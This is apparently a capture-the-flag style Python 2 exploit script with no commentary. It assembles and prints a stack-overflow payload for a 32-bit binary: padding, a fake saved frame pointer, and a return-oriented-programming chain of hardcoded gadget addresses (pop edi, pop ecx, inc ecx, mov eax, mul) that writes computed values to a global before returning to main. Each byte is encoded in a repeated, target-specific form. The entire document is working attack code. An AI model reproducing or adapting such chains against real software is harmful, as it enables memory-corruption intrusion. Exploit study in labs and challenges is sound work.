p = 'AAA\n'

A_s = ('\x61' * 12 + '\x00' * 3) * 12
junk = '\x00' * 12 + '\x00' * 3 + '\x50' * 12 + '\x00' * 3 + '\x0e' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
ebp = '\x38' * 12 + '\x00' * 3 + '\xcf' * 12 + '\x00' * 3 + '\xff' * 12 + '\x00' * 3 + '\xff' * 12 + '\x00' * 3
GA_ret = '\x0e' * 12 + '\x00' * 3 + '\x90' * 12 + '\x00' * 3 + '\x04' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
GA_pop_edi = '\x6f' * 12 + '\x00' * 3 + '\xb3' * 12 + '\x00' * 3 + '\x04' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
valid_addr = '\xb6' * 12 + '\x00' * 3 + '\xce' * 12 + '\x00' * 3 + '\xff' * 12 + '\x00' * 3 + '\xff' * 12 + '\x00' * 3
GA_pop_ecx = '\xc1' * 12 + '\x00' * 3 + '\x40' * 12 + '\x00' * 3 + '\x06' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
glb_addr = '\xc0' * 12 + '\x00' * 3 + '\x6c' * 12 + '\x00' * 3 + '\x0e' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
GA_inc_ecx = '\x95' * 12 + '\x00' * 3 + '\xce' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
GA_mov_eax_3 = '\x20' * 12 + '\x00' * 3 + '\x8d' * 12 + '\x00' * 3 + '\x09' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
GA_mov_eax_4 = '\x30' * 12 + '\x00' * 3 + '\x8d' * 12 + '\x00' * 3 + '\x09' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
GA_mov_eax_5 = '\x40' * 12 + '\x00' * 3 + '\x8d' * 12 + '\x00' * 3 + '\x09' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
GA_mov_eax_6 = '\x50' * 12 + '\x00' * 3 + '\x8d' * 12 + '\x00' * 3 + '\x09' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
GA_mul = '\xd8' * 12 + '\x00' * 3 + '\xb2' * 12 + '\x00' * 3 + '\x06' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
GA_mov_ecx_eax = '\x4d' * 12 + '\x00' * 3 + '\x8b' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3 + '\x08' * 12 + '\x00' * 3
ret_to_main = '\xb7' * 12 + '\x00' * 3 + '\x9e' * 12 + '\x00' * 3 + '\x04' * 12 + '\x00' * 3 + '\x08' * 12 + '\x09\x00\x00'

y = p + A_s + junk + junk + ebp + GA_ret + GA_pop_edi + valid_addr + GA_pop_ecx + glb_addr + GA_inc_ecx + GA_inc_ecx + GA_mov_eax_3 + GA_mul + GA_ret + GA_mov_ecx_eax + junk + GA_mov_eax_4 + GA_mul + GA_ret + GA_mov_ecx_eax + junk + GA_mov_eax_5 + GA_mul + GA_ret + GA_mov_ecx_eax + junk + GA_mov_eax_6 + GA_mul + GA_ret + GA_mov_ecx_eax + junk + ret_to_main

print y
